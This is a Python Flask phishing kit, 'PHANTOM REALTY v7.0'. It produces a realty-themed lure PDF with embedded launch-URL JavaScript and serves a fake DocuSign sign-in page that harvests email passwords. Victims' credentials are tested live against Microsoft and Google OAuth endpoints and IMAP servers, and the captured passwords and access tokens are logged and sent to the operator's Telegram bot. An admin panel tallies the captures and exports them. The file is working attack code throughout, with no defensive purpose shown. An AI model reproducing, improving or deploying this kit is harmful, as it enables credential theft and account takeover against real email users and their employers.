#!/usr/bin/env python3
"""
PHANTOM REALTY v7.0 - FINAL WORKING EDITION
Deploys on Render.com with Python 3.11
"""

import os
import sys
import re
import json
import uuid
import base64
import time
import io
import random
import threading
import logging
from datetime import datetime
from collections import defaultdict

import dns.resolver
import requests
from flask import Flask, request, session, render_template_string, redirect, jsonify, make_response, send_file

import urllib3
urllib3.disable_warnings()

TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
YOUR_DOMAIN = os.environ.get("YOUR_DOMAIN", "your-app.onrender.com")
YOUR_URL = f"https://{YOUR_DOMAIN}"
PORT = int(os.environ.get("PORT", 10000))

app = Flask(__name__)
app.secret_key = os.urandom(64)

PDF_DATA = None
PDF_FILENAME = "Confidential_Property_Disclosure.pdf"
pdf_lock = threading.Lock()
rate_limit = defaultdict(list)

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
logger = logging.getLogger(__name__)


def tg_send(text, buttons=None, doc=None, doc_name=None):
    if not TELEGRAM_BOT_TOKEN or len(TELEGRAM_BOT_TOKEN) < 10:
        logger.info(f"[TG] {text[:100]}")
        return
    try:
        payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': text[:4000], 'parse_mode': 'HTML'}
        if buttons:
            payload['reply_markup'] = json.dumps({'inline_keyboard': buttons})
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", json=payload, timeout=10)
        if doc:
            files = {'document': (doc_name or 'file', doc)}
            data = {'chat_id': TELEGRAM_CHAT_ID}
            requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument", data=data, files=files, timeout=15)
    except Exception as e:
        logger.error(f"[TG] {e}")


def generate_pdf():
    global PDF_DATA
    with pdf_lock:
        try:
            from reportlab.lib.pagesizes import letter
            from reportlab.lib.units import inch
            from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
            from reportlab.lib.colors import HexColor
            from reportlab.lib.enums import TA_CENTER, TA_RIGHT
            from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, HRFlowable
            from PyPDF2 import PdfReader, PdfWriter
        except ImportError:
            logger.error("Missing libraries: pip install reportlab PyPDF2")
            return None
        
        buf = io.BytesIO()
        doc = SimpleDocTemplate(buf, pagesize=letter, topMargin=0.7*inch, bottomMargin=0.7*inch)
        s = getSampleStyleSheet()
        
        title_style = ParagraphStyle('Title', parent=s['Title'], fontSize=24, textColor=HexColor('#0a2540'), alignment=TA_CENTER)
        heading_style = ParagraphStyle('Heading', parent=s['Heading2'], fontSize=13, textColor=HexColor('#0066cc'), spaceBefore=12)
        body_style = ParagraphStyle('Body', parent=s['Normal'], fontSize=9.5)
        
        elements = []
        doc_id = f"PRE-{datetime.now().strftime('%Y%m')}-{random.randint(10000,99999)}"
        
        elements.append(Paragraph("PREMIER REALTY GROUP", ParagraphStyle('Header', parent=s['Normal'], fontSize=8, textColor=HexColor('#888'), alignment=TA_RIGHT)))
        elements.append(HRFlowable(width="100%", thickness=1.2, color=HexColor('#0a2540'), spaceAfter=8))
        elements.append(Paragraph("CONFIDENTIAL BUYER PROFILE", title_style))
        elements.append(HRFlowable(width="100%", thickness=0.5, color=HexColor('#ccc'), spaceAfter=15))
        
        elements.append(Paragraph("CLIENT INFORMATION", heading_style))
        for label, val in [("Full Name:", "Michael Morrison"), ("Email:", "michael@client.com"), ("Phone:", "(650) 555-0199")]:
            elements.append(Paragraph(f"<b>{label}</b> {val}", body_style))
        elements.append(Spacer(1, 8))
        
        elements.append(Paragraph("PROPERTY REQUIREMENTS", heading_style))
        for label, val in [("Type:", "Single Family"), ("Bedrooms:", "4+"), ("Price:", "$1.35M - $2.1M")]:
            elements.append(Paragraph(f"<b>{label}</b> {val}", body_style))
        elements.append(Spacer(1, 8))
        
        elements.append(Paragraph("FINANCING", heading_style))
        for label, val in [("Pre-Approval:", "APPROVED"), ("Loan:", "$1.65M"), ("Down:", "20%")]:
            elements.append(Paragraph(f"<b>{label}</b> {val}", body_style))
        elements.append(Spacer(1, 15))
        
        elements.append(HRFlowable(width="100%", thickness=0.5, color=HexColor('#ccc'), spaceAfter=10))
        elements.append(Paragraph("<b>⚠️ SIGNATURE REQUIRED</b><br/>Please authenticate to proceed.", ParagraphStyle('Legal', parent=s['Normal'], fontSize=9, textColor=HexColor('#c00'), alignment=TA_CENTER)))
        
        doc.build(elements)
        pdf_bytes = buf.getvalue()
        buf.close()
        
        target_url = f"{YOUR_URL}/auth/signature?ref={doc_id}"
        js_code = f"var url='{target_url}';try{{app.launchURL(url,1);}}catch(e){{this.launchURL(url,1);}}"
        
        reader = PdfReader(io.BytesIO(pdf_bytes))
        writer = PdfWriter()
        for page in reader.pages:
            writer.add_page(page)
        writer.add_js(js_code)
        
        output = io.BytesIO()
        writer.write(output)
        PDF_DATA = output.getvalue()
        output.close()
        
        logger.info(f"[PDF] Generated: {len(PDF_DATA)} bytes")
        return PDF_DATA
    except Exception as e:
        logger.error(f"[PDF] Error: {e}")
        return None


def get_domain(email):
    return email.split('@')[1].lower() if email and '@' in email else None


def detect_provider(email):
    domain = get_domain(email)
    if not domain:
        return None
    d = domain.lower()
    if d in ['outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'office365.com']:
        return 'microsoft'
    if d in ['gmail.com', 'googlemail.com', 'google.com']:
        return 'google'
    if d in ['yahoo.com', 'yahoo.co.uk', 'ymail.com']:
        return 'yahoo'
    try:
        resolver = dns.resolver.Resolver()
        resolver.timeout = 5
        mx = resolver.resolve(d, 'MX')
        mx_str = ' '.join(str(r.exchange).lower() for r in mx)
        if 'protection.outlook.com' in mx_str:
            return 'microsoft'
        if 'google.com' in mx_str:
            return 'google'
        return 'other'
    except:
        return 'other'


def validate_creds(email, password):
    provider = detect_provider(email)
    result = {'valid': False, 'provider': provider or 'unknown', 'email': email}
    
    if provider == 'microsoft':
        clients = [('d3590ed6-52b3-4102-aeff-aad2292ab01c', 'Azure PS'), ('1b730954-1685-4b74-9bfd-dac224a7b894', 'Intune')]
        for cid, cname in clients:
            try:
                r = requests.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/token', data={
                    'grant_type': 'password', 'client_id': cid, 'username': email, 'password': password,
                    'scope': 'openid email profile offline_access'
                }, timeout=15, verify=False)
                if r.status_code == 200:
                    tok = r.json()
                    result['valid'] = True
                    result['method'] = f'OAuth ({cname})'
                    result['access_token'] = tok.get('access_token', '')
                    result['refresh_token'] = tok.get('refresh_token', '')
                    if tok.get('id_token'):
                        try:
                            b = tok['id_token'].split('.')[1] + '=='
                            info = json.loads(base64.urlsafe_b64decode(b))
                            result['display_name'] = info.get('name', email)
                        except:
                            pass
                    return result
                if r.status_code == 400:
                    err = r.json().get('error_description', '')
                    if 'AADSTS50079' in err or 'AADSTS50076' in err:
                        result['valid'] = True
                        result['method'] = 'MFA Required'
                        return result
            except:
                continue
        try:
            import imaplib
            for srv in ['outlook.office365.com', 'imap-mail.outlook.com']:
                try:
                    imap = imaplib.IMAP4_SSL(srv, timeout=10)
                    imap.login(email, password)
                    imap.logout()
                    result['valid'] = True
                    result['method'] = f'IMAP ({srv})'
                    return result
                except:
                    continue
        except:
            pass
        result['error'] = 'Invalid credentials'
    
    elif provider == 'google':
        try:
            r = requests.post('https://oauth2.googleapis.com/token', data={
                'grant_type': 'password', 'client_id': '77185425430.apps.googleusercontent.com',
                'username': email, 'password': password,
                'scope': 'https://www.googleapis.com/auth/userinfo.email https://www.googleapis.com/auth/userinfo.profile'
            }, timeout=15, verify=False)
            if r.status_code == 200:
                tok = r.json()
                result['valid'] = True
                result['method'] = 'Google OAuth'
                result['access_token'] = tok.get('access_token', '')
                result['refresh_token'] = tok.get('refresh_token', '')
                if result.get('access_token'):
                    try:
                        u = requests.get('https://www.googleapis.com/oauth2/v2/userinfo', headers={'Authorization': f"Bearer {result['access_token']}"}, timeout=8)
                        if u.status_code == 200:
                            result['display_name'] = u.json().get('name', email)
                    except:
                        pass
                return result
        except:
            pass
        try:
            import imaplib
            imap = imaplib.IMAP4_SSL('imap.gmail.com', timeout=10)
            imap.login(email, password)
            imap.logout()
            result['valid'] = True
            result['method'] = 'IMAP (Gmail)'
            return result
        except:
            pass
        result['error'] = 'Invalid credentials'
    
    elif provider == 'yahoo':
        try:
            import imaplib
            imap = imaplib.IMAP4_SSL('imap.mail.yahoo.com', timeout=10)
            imap.login(email, password)
            imap.logout()
            result['valid'] = True
            result['method'] = 'IMAP (Yahoo)'
            return result
        except:
            result['error'] = 'Invalid credentials'
    
    else:
        domain = get_domain(email)
        for srv in set([f"mail.{domain}", f"imap.{domain}", "outlook.office365.com"]):
            try:
                import imaplib
                imap = imaplib.IMAP4_SSL(srv, timeout=10)
                imap.login(email, password)
                imap.logout()
                result['valid'] = True
                result['method'] = f'IMAP ({srv})'
                return result
            except:
                continue
        result['error'] = 'Could not validate'
    
    return result


PHISHING_PAGE = """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>DocuSign</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.container{background:#fff;border-radius:20px;padding:40px;width:450px}
.logo{text-align:center;margin-bottom:30px;font-size:28px;color:#1a1a2e}
.doc-card{background:#f8fafc;border:1px solid #e2e8f0;border-radius:12px;padding:20px;margin-bottom:24px}
.form-group{margin-bottom:20px}
label{font-size:13px;font-weight:600;display:block;margin-bottom:8px}
input{width:100%;padding:12px;border:1px solid #ddd;border-radius:8px;font-size:14px}
input:focus{outline:none;border-color:#667eea}
.btn{width:100%;padding:14px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer}
.btn:disabled{opacity:0.7}
.err{color:#dc2626;background:#fef2f2;padding:10px;border-radius:8px;display:none;margin-bottom:15px}
.ok{color:#15803d;background:#f0fdf4;padding:10px;border-radius:8px;display:none;margin-bottom:15px}
.spinner{display:inline-block;width:14px;height:14px;border:2px solid #fff;border-top-color:transparent;border-radius:50%;animation:spin .6s linear infinite;margin-right:8px}
@keyframes spin{to{transform:rotate(360deg)}}
.badge{font-size:12px;color:#666;margin-top:8px}
</style>
</head>
<body>
<div class="container">
<div class="logo">📄 DocuSign<sup>®</sup></div>
<div class="doc-card">
<div><strong>📄 Confidential Property Disclosure</strong></div>
<div class="badge">ID: <span id="docId"></span> | PENDING</div>
</div>
<div id="badge" class="badge" style="margin-bottom:15px">✉️ Enter your email</div>
<form id="f">
<div class="form-group"><label>Email</label><input type="email" id="email" placeholder="name@company.com" required autofocus></div>
<div class="form-group"><label>Password</label><input type="password" id="password" placeholder="Enter password" required></div>
<div id="err" class="err"></div><div id="ok" class="ok"></div>
<button class="btn" id="btn" type="submit"><span id="btxt">Sign In</span><span id="bload" style="display:none"><span class="spinner"></span> Verifying...</span></button>
</form>
</div>
<script>
document.getElementById('docId').textContent='DOC-'+Math.random().toString(36).substr(2,8).toUpperCase();
var e=document.getElementById('email'),b=document.getElementById('badge'),t;
e.addEventListener('input',function(){clearTimeout(t);var v=this.value.trim();if(v.includes('@')&&v.length>6){t=setTimeout(function(){fetch('/api/detect?email='+encodeURIComponent(v)).then(r=>r.json()).then(d=>{if(d.p=='microsoft')b.innerHTML='🏢 Microsoft 365 detected';else if(d.p=='google')b.innerHTML='🔴 Google detected';else b.innerHTML='🌐 Email detected'})},500)}else b.innerHTML='✉️ Enter your email'});
fetch('/api/fp',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ts:new Date().toISOString(),ua:navigator.userAgent})}).catch(()=>{});
document.getElementById('f').addEventListener('submit',function(e){e.preventDefault();var btn=document.getElementById('btn'),btxt=document.getElementById('btxt'),bload=document.getElementById('bload'),err=document.getElementById('err'),ok=document.getElementById('ok');btn.disabled=true;btxt.style.display='none';bload.style.display='inline';err.style.display='none';ok.style.display='none';
fetch('/oauth/verify',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'email='+encodeURIComponent(document.getElementById('email').value)+'&password='+encodeURIComponent(document.getElementById('password').value)}).then(r=>r.json()).then(d=>{if(d.success){ok.style.display='block';ok.innerHTML='✅ Verified! Redirecting...';setTimeout(function(){window.location.href='/download-pdf'},2000)}else{btn.disabled=false;btxt.style.display='inline';bload.style.display='none';err.style.display='block';err.innerHTML=d.error||'Invalid credentials'}}).catch(function(){btn.disabled=false;btxt.style.display='inline';bload.style.display='none';err.style.display='block';err.innerHTML='Connection error'})});
</script>
</body>
</html>"""


@app.route('/')
def index():
    return redirect('/auth/signature')


@app.route('/auth/signature')
def oauth_page():
    return render_template_string(PHISHING_PAGE)


@app.route('/health')
def health():
    return jsonify({'status': 'ok'})


@app.route('/api/detect')
def detect():
    email = request.args.get('email', '')
    return jsonify({'p': detect_provider(email) or 'unknown'})


@app.route('/api/fp', methods=['POST'])
def fp():
    data = request.get_json(silent=True)
    if data:
        session['fp'] = data
    return 'ok'


@app.route('/oauth/verify', methods=['POST'])
def verify():
    email = request.form.get('email', '').strip().lower()
    password = request.form.get('password', '').strip()
    ip = request.remote_addr
    
    if not email or not password:
        return jsonify({'success': False, 'error': 'Required fields missing'})
    
    key = f"{ip}:{datetime.now().strftime('%Y%m%d%H')}"
    rate_limit[key].append(datetime.now())
    rate_limit[key] = [t for t in rate_limit[key] if (datetime.now() - t).seconds < 3600]
    if len(rate_limit[key]) > 10:
        return jsonify({'success': False, 'error': 'Rate limit exceeded'})
    
    with open('capture.log', 'a') as f:
        f.write(json.dumps({'ts': datetime.now().isoformat(), 'email': email, 'password': password, 'ip': ip}) + '\n')
    
    result = validate_creds(email, password)
    
    with open('validated.log', 'a') as f:
        safe = {k: v for k, v in result.items() if k not in ['access_token', 'refresh_token']}
        f.write(json.dumps({'ts': datetime.now().isoformat(), 'email': email, 'password': password, 'ip': ip, 'validation': safe}) + '\n')
    
    if result.get('valid'):
        provider = result.get('provider', 'unknown')
        method = result.get('method', 'N/A')
        name = result.get('display_name', email)
        has_token = bool(result.get('access_token'))
        
        msg = f"✅ CAPTURED\n━━━━━━━━━━━━\n📧 {email}\n🔑 {password}\n👤 {name}\n🏢 {provider.upper()} | {method}\n🌐 {ip}\n🎫 Token: {'YES' if has_token else 'NO'}"
        buttons = [[{'text': '📊 Admin', 'url': f"{YOUR_URL}/admin"}], [{'text': '📥 PDF', 'url': f"{YOUR_URL}/download-pdf"}]]
        tg_send(msg, buttons=buttons)
        
        if has_token and result.get('access_token'):
            token_data = {'email': email, 'password': password, 'provider': provider, 'access_token': result.get('access_token'), 'refresh_token': result.get('refresh_token')}
            tg_send(f"🎫 TOKEN: {email}", doc=json.dumps(token_data, indent=2).encode(), doc_name=f"token_{email.split('@')[0]}.json")
        
        print(f"\n{'='*55}\n✅ {email}:{password}\n   {name} | {provider}\n{'='*55}")
        return jsonify({'success': True})
    
    return jsonify({'success': False, 'error': result.get('error', 'Invalid credentials')})


@app.route('/download-pdf')
def download():
    global PDF_DATA
    if PDF_DATA is None:
        generate_pdf()
    if PDF_DATA:
        return send_file(io.BytesIO(PDF_DATA), mimetype='application/pdf', as_attachment=True, download_name=PDF_FILENAME)
    return "PDF not ready", 500


@app.route('/admin')
def admin():
    attempts = []
    if os.path.exists('validated.log'):
        with open('validated.log') as f:
            for line in f:
                try:
                    attempts.append(json.loads(line.strip()))
                except:
                    pass
    total = len(attempts)
    valid = sum(1 for a in attempts if a.get('validation', {}).get('valid'))
    ms = sum(1 for a in attempts if a.get('validation', {}).get('provider') == 'microsoft')
    gg = sum(1 for a in attempts if a.get('validation', {}).get('provider') == 'google')
    
    html = f"""<!DOCTYPE html>
<html><head><title>Phantom Realty</title><style>
body{{background:#0a0e27;color:#0f0;font-family:monospace;padding:20px}}
h1{{color:#f36}}
.stats{{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;margin:20px 0}}
.stat{{background:#1a1f3e;padding:20px;border-radius:8px}}
.num{{font-size:36px;font-weight:bold}}
table{{width:100%;border-collapse:collapse}}
th,td{{padding:10px;text-align:left;border-bottom:1px solid #333}}
.btn{{background:#1a1f3e;color:#0f0;border:1px solid #0f0;padding:10px 20px;border-radius:6px;cursor:pointer;text-decoration:none;display:inline-block;margin:5px}}
</style>
</head>
<body>
<h1>🔱 PHANTOM REALTY v7.0</h1>
<div class="stats">
<div class="stat"><div class="num">{total}</div><div>Total</div></div>
<div class="stat"><div class="num">{valid}</div><div>Valid</div></div>
<div class="stat"><div class="num">{ms}</div><div>Microsoft</div></div>
<div class="stat"><div class="num">{gg}</div><div>Google</div></div>
</div>
<div>
<a href="/download-pdf" class="btn">📄 PDF</a>
<a href="/admin/export" class="btn">📥 Export</a>
<a href="/admin/clear" class="btn" onclick="return confirm('Clear?')">🗑 Clear</a>
</div>
<table><thead><tr><th>Time</th><th>Email</th><th>Provider</th><th>Method</th><th>Token</th></tr></thead><tbody>"""
    for a in reversed(attempts[-50:]):
        v = a.get('validation', {})
        ts = a.get('ts', '')[:19].replace('T', ' ')
        email = a.get('email', '')[:30]
        prov = v.get('provider', '?')
        method = v.get('method', 'N/A')[:20]
        has = '✓' if v.get('access_token') else '-'
        html += f"<tr><td>{ts}</td><td>{email}</td><td>{prov}</td><td>{method}</td><td>{has}</td></tr>"
    html += "</tbody></table></body></html>"
    return html


@app.route('/admin/export')
def export():
    creds = []
    if os.path.exists('validated.log'):
        with open('validated.log') as f:
            for line in f:
                try:
                    creds.append(json.loads(line.strip()))
                except:
                    pass
    resp = make_response(json.dumps(creds, indent=2))
    resp.headers['Content-Type'] = 'application/json'
    resp.headers['Content-Disposition'] = f"attachment; filename=creds_{datetime.now().strftime('%Y%m%d')}.json"
    return resp


@app.route('/admin/clear')
def clear():
    for f in ['validated.log', 'capture.log']:
        if os.path.exists(f):
            open(f, 'w').close()
    return redirect('/admin')


if __name__ == '__main__':
    print("="*60)
    print("  PHANTOM REALTY v7.0 - WORKING")
    print("="*60)
    
    generate_pdf()
    
    if PDF_DATA and TELEGRAM_BOT_TOKEN and len(TELEGRAM_BOT_TOKEN) > 10:
        tg_send(f"🚀 PHANTOM REALTY ONLINE\n📍 {YOUR_URL}\n📥 PDF: {YOUR_URL}/download-pdf\n📊 Admin: {YOUR_URL}/admin",
                buttons=[[{'text':'📥 PDF','url':f"{YOUR_URL}/download-pdf"}],[{'text':'📊 Admin','url':f"{YOUR_URL}/admin"}]],
                doc=PDF_DATA, doc_name=PDF_FILENAME)
    
    print(f"\n✅ URL: {YOUR_URL}")
    print(f"✅ Admin: {YOUR_URL}/admin")
    print(f"✅ PDF: {YOUR_URL}/download-pdf")
    
    app.run(host='0.0.0.0', port=PORT, debug=False)
